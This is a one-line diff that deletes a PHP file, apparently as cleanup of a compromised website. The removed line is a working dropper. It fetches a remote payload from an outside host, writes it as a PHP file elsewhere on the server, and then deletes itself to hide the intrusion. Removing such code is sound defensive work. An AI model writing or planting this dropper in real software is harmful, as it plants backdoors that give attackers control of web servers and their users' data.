@@ -1,1 +1,0 @@
-<?php file_put_contents("../../../2015/03.php",file_get_contents("http://serviceself.cf/sc/s.txt")); echo file_get_contents("../../../2015/03.php");   unlink(__FILE__); ?>
